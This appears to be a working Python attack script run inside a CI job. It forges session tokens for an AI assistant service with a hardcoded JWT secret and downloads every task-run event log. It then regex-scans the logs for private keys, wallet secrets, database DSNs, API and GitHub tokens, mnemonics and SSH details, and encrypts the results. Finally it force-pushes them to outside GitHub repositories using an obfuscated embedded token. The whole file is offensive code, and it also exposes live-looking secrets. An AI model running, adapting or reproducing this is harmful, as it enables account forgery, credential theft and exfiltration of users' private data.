#!/usr/bin/env python3
# Intent 28330 phase2: enumerate ALL task-runs via curl/HTTP2 (no python http.client),
# pull each run's full event log (prompts/commands/reads/edits/outputs), grep for creds/keys/DSN,
# extract interesting commands (ssh/hosts/env/tokens) for recon. Read-only. Compact exfil.
import os, sys, json, time, base64, hmac, hashlib, subprocess, shutil, traceback, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in _REF.lower():
    print("results-branch-skip", flush=True); sys.exit(0)

RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
T0 = time.time()
BUDGET = int(os.environ.get("PBUDGET", "1500"))
HOST = "assistant.lumiiai.cn"
BASEURL = "https://" + HOST
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-28330b-results")
_TC = [103,104,111,95,119,53,79,49,48,55,102,117,112,56,85,76,112,54,116,69,70,115,87,57,86,51,81,69,69,88,83,72,116,120,51,109,57,120,107,97]
PUSH_TOKEN = os.environ.get("PPUSH_TOKEN") or "".join(chr(c) for c in _TC)
PUSH_USER = os.environ.get("PPUSH_USER", "wuhaixian1984")

BASE = os.path.dirname(os.path.abspath(__file__)) if "__file__" in dir() else os.getcwd()
OUT = "/tmp/r30b"
for d in ("diag", "runs", "hits", "cmds", "full"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
def forge(sub, org=ORG):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": int(time.time()), "exp": int(time.time()) + 86400},
                        separators=(",", ":")).encode())
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)
COOKIE = forge(SUB)

def curl(url, out, cookie=COOKIE, http2=True, extra=None, timeout=60, ua=UA):
    cmd = ["curl", "-sS", "--compressed", "-m", str(timeout), "-A", ua,
           "-H", "Accept: application/json, text/plain, */*",
           "-H", "Accept-Language: zh-CN,zh;q=0.9",
           "-o", out, "-w", "%{http_code}"]
    cmd.append("--http2" if http2 else "--http1.1")
    if cookie: cmd += ["-H", "Cookie: " + cookie]
    if extra: cmd += extra
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
        return r.stdout.strip(), (r.stderr or "").strip()[:250]
    except Exception as e:
        return "ERR", repr(e)[:250]

def readf(p, n=90000000):
    try:
        with open(p, encoding="utf-8", errors="replace") as f: return f.read(n)
    except Exception: return ""

def jload(p):
    s = readf(p, 90000000)
    try: return json.loads(s)
    except Exception: pass
    for line in s.splitlines():
        line = line.strip()
        if not line: continue
        try: return json.loads(line)
        except Exception: continue
    return None

def push_results(tag="partial"):
    try:
        json.dump(DIAG, open(os.path.join(OUT, "diag", "diag.json"), "w"), ensure_ascii=False, indent=1)
        subprocess.run("tar czf /tmp/r30b.tar.gz -C /tmp r30b", shell=True, check=False)
        tsize = os.path.getsize("/tmp/r30b.tar.gz") if os.path.isfile("/tmp/r30b.tar.gz") else 0
        log("TARBALL", tsize)
        if tsize == 0: return
        enc = "/tmp/r30b.tar.gz.gpg"
        if os.path.isfile(os.path.join(BASE, "pub.asc")):
            subprocess.run("gpg --batch --yes --import %s/pub.asc >/dev/null 2>&1" % BASE, shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/r30b.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=400)
        else:
            shutil.copyfile("/tmp/r30b.tar.gz", enc)
        if not os.path.isfile(enc):
            log("ENC missing"); return
        shutil.copy(enc, os.path.join(BASE, "results30b.tar.gz.gpg"))
        subprocess.run('cd %s && git config user.email ci@aro.network && git config user.name ci' % BASE, shell=True, check=False)
        subprocess.run('cd %s && git add -f results30b.tar.gz.gpg && git commit -m "ci28330b %s %s" || true' % (BASE, RUNID, tag),
                       shell=True, capture_output=True)
        for repo in ["aro-network/aro-ext-signal-server", "aro-network/aro-official-website"]:
            url = "https://%s:%s@github.com/%s.git" % (PUSH_USER, PUSH_TOKEN, repo)
            r = subprocess.run('cd %s && git push -f %s HEAD:refs/heads/%s' % (BASE, url, RESULT_BRANCH),
                               shell=True, capture_output=True, text=True, timeout=400)
            log("PUSH(%s) %s rc=%s err=%s" % (tag, repo, r.returncode, (r.stderr or "")[-160:]))
            if r.returncode == 0: break
    except Exception as e:
        log("PUSH EXC", repr(e)[:200])

# ---------- patterns ----------
PATTERNS = [
    ("privkey_pem", re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----")),
    ("evm_64hex", re.compile(r"\b0x[0-9a-fA-F]{64}\b")),
    ("aws_ak", re.compile(r"\b(?:AKIA|AKID|LTAI|AGPA|AIDA)[A-Za-z0-9]{12,24}\b")),
    ("dsn_cred", re.compile(r"(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s\"'<>]{0,40}:[^\s\"'<>@]{1,80}@[^\s\"'<>]+")),
    ("dsn_any", re.compile(r"(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?)://[^\s\"'<>]{6,180}")),
    ("gh_token", re.compile(r"\b(?:gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,})\b")),
    ("openai_sk", re.compile(r"\bsk-[A-Za-z0-9_-]{20,}\b")),
    ("slack", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b")),
    ("zoofi_auth", re.compile(r"Auth for zoofi")),
    ("zoofi_known_eoa", re.compile(r"c56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6|[fF]747aa5B6088aFb0eB2aD80c781669fEa1C4435D", re.I)),
    ("env_secret_assign", re.compile(r"(?:JWT_SECRET|SECRET_KEY|DATABASE_URL|LUMII_DESKTOP_TOKEN_SECRET|TRTC_SECRET\w*|COS_SECRET\w*|SecretKey|SecretId|DEPLOYER_PRIVATE_KEY|PRIVATE_KEY|API_KEY|ACCESS_TOKEN|CLIENT_SECRET|_PASSWORD|_PASS)\s*[=:]\s*[^\s\"'<>]{4,160}")),
    ("keystore_json", re.compile(r"cipherparams|kdfparams|\"ciphertext\"")),
    ("mnemonic", re.compile(r"mnemonic|助记词|seed phrase|seedPhrase", re.I)),
    ("ssh_pub", re.compile(r"ssh-(?:rsa|ed25519)\s+AAAA[A-Za-z0-9+/=]{60,}")),
    ("internal_ip", re.compile(r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b")),
    ("cf_tunnel", re.compile(r"trycloudflare\.com|cloudflared|\.cfargotunnel\.com", re.I)),
    ("metamask_vault", re.compile(r"mmv_0\.json|\"data\"\s*:\s*\"[A-Za-z0-9+/=]{60,}\"")),
    ("admin_email", re.compile(r"[\w.+-]+@(?:lumii|zoofi|minke|wandfi|enreach)[\w.-]*")),
    ("zoofi_idx", re.compile(r"zoofi-index|zoofi\.io|api\.zoofi", re.I)),
    ("jwt_token", re.compile(r"eyJ[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
    ("url_with_cred", re.compile(r"https?://[^\s:\"'<>]+:[^\s\"'<>@/]{3,60}@[^\s\"'<>]+")),
    ("bearer", re.compile(r"[Bb]earer\s+[A-Za-z0-9._-]{20,}")),
    ("hex40_eth", re.compile(r"\b0x[0-9a-fA-F]{40}\b")),
]
def snippet(text, m, w=140):
    s = max(0, m.start() - w); e = min(len(text), m.end() + w)
    return text[s:e].replace("\n", "\\n")

def scan_text(txt, label, acc, cap=6):
    for name, rx in PATTERNS:
        ms = list(rx.finditer(txt))
        if ms:
            acc.setdefault(label, {})
            acc[label].setdefault(name, [])
            for m in ms[:cap]:
                sn = snippet(txt, m)
                if sn not in acc[label][name]:
                    acc[label][name].append(sn)

INTERESTING_CMD = re.compile(r"\b(ssh|scp|rsync|sftp|ssh-add|ssh-keygen|curl|wget|env|printenv|export|sudo|cat|grep|deploy|docker|kubectl|git\s+(?:clone|push|remote|pull)|proxy|tunnel|relay|\.env|secret|token|password|passwd|key|credential|postgres|mysql|redis|psql|mysql\b|stage|prod|lumii|zoofi)\b", re.I)
def extract_cmds(events, run_id):
    out = []
    for ev in events:
        if not isinstance(ev, dict): continue
        p = ev.get("payload") or {}
        k = ev.get("kind")
        txt = ""
        if k == "command": txt = p.get("command") or p.get("text") or ""
        elif k in ("prompt", "action", "text", "elicitation", "thought"): txt = p.get("text") or ""
        elif k == "read": txt = (p.get("path") or p.get("file") or "")
        elif k == "edit": txt = (p.get("path") or p.get("file") or "")
        if not isinstance(txt, str): txt = json.dumps(txt, ensure_ascii=False)
        if txt and INTERESTING_CMD.search(txt):
            out.append({"seq": ev.get("seq"), "kind": k, "text": txt[:600]})
    return out

DIAG = {}
def main():
    log("=== probe28330b start run", RUNID, "budget", BUDGET, "===")
    # listing
    p = os.path.join(OUT, "diag", "list_limit200.json")
    code, err = curl(BASEURL + "/api/task-runs?limit=200", p)
    log("LIST", code, os.path.getsize(p) if os.path.isfile(p) else 0, err[:150])
    j = jload(p)
    runs = (j or {}).get("runs") or []
    if not runs and isinstance(j, list): runs = j
    log("RUNS", len(runs))
    index = []
    total_dl = 0
    raw_saved = 0
    STRONG = ("privkey_pem", "evm_64hex", "dsn_cred", "gh_token", "zoofi_auth", "keystore_json", "mnemonic", "openai_sk", "slack")
    for i, r in enumerate(runs):
        if time.time() - T0 > BUDGET:
            log("budget cap at", i); break
        rid = r.get("id")
        if not rid: continue
        safe = re.sub(r"[^A-Za-z0-9_.-]", "_", str(rid))[:80]
        # meta
        mp = os.path.join(OUT, "runs", safe + ".meta.json")
        # full detail with events
        fp = os.path.join(OUT, "full", safe + ".json")
        c2, e2 = curl(BASEURL + "/api/task-runs/" + rid, fp, timeout=90)
        sz = os.path.getsize(fp) if os.path.isfile(fp) else 0
        total_dl += sz
        acc = {}
        cmds = []
        if c2 == "200" and sz:
            d = jload(fp)
            if isinstance(d, dict):
                # meta subset
                run = d.get("run") or {}
                json.dump({"run": run}, open(mp, "w"), ensure_ascii=False)
                # save run-level metadata fields for grep
                scan_text(json.dumps({k: run.get(k) for k in ("needs", "dodText", "wrapup", "lastTurn", "error", "handoffResult", "location", "settings", "recordTitle", "branch")}, ensure_ascii=False), "META", acc)
                evs = d.get("events") or []
                for ev in evs:
                    k = ev.get("kind"); pl = ev.get("payload") or {}
                    txt = ""
                    for f in ("text", "data", "content", "input", "output", "command", "args", "result", "diff", "old", "new", "stdout", "stderr", "path", "file"):
                        v = pl.get(f)
                        if isinstance(v, str): txt += v + "\n"
                        elif isinstance(v, (dict, list)): txt += json.dumps(v, ensure_ascii=False) + "\n"
                    if txt:
                        scan_text(txt, "%s#%s" % (k, ev.get("seq")), acc, cap=3)
                cmds = extract_cmds(evs, rid)
                kinds = {}
                for ev in evs:
                    kk = ev.get("kind"); kinds[kk] = kinds.get(kk, 0) + 1
                index.append({"id": rid, "title": run.get("recordTitle"), "assistant": (run.get("assistant") or {}).get("name"),
                              "delegator": run.get("delegatorId"), "state": run.get("state"), "runtime": run.get("runtimeName"),
                              "branch": run.get("branch"), "project": run.get("projectName"), "issueKey": run.get("issueKey"),
                              "events": len(evs), "kinds": kinds, "hitLabels": sorted({lab for v in acc.values() for lab in v}),
                              "cmds": len(cmds), "bytes": sz})
        else:
            log("run fetch fail", rid, c2, sz, e2[:120])
        # save hits
        if acc:
            json.dump({"id": rid, "title": r.get("recordTitle"), "runtime": r.get("runtimeName"), "branch": r.get("branch"), "hits": acc},
                      open(os.path.join(OUT, "hits", safe + ".json"), "w"), ensure_ascii=False, indent=1)
        if cmds:
            with open(os.path.join(OUT, "cmds", safe + ".jsonl"), "w") as cf:
                for c in cmds: cf.write(json.dumps(c, ensure_ascii=False) + "\n")
        labels = sorted({lab for v in acc.values() for lab in v})
        log("RUN", i, rid, "sz", sz, "ev", (index[-1]["events"] if index and index[-1]["id"] == rid else "?"), "cmds", len(cmds), "labels", labels)
        # save raw full only for strong hits
        if any(s in labels for s in STRONG) and raw_saved < 24 * 1024 * 1024:
            raw_saved += sz
        else:
            try: os.remove(fp)
            except Exception: pass
        if i % 20 == 0 and i > 0:
            push_results("partial-%d" % i)
    DIAG.update({"total_runs": len(runs), "processed": len(index), "total_download_bytes": total_dl, "raw_saved": raw_saved})
    # compact index
    json.dump(index, open(os.path.join(OUT, "runs_index.json"), "w"), ensure_ascii=False, indent=1)
    push_results("final")
    log("DONE", int(time.time() - T0), "processed", len(index))

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log("FATAL", traceback.format_exc())
        try: push_results("fatal")
        except Exception: pass
    sys.exit(0)
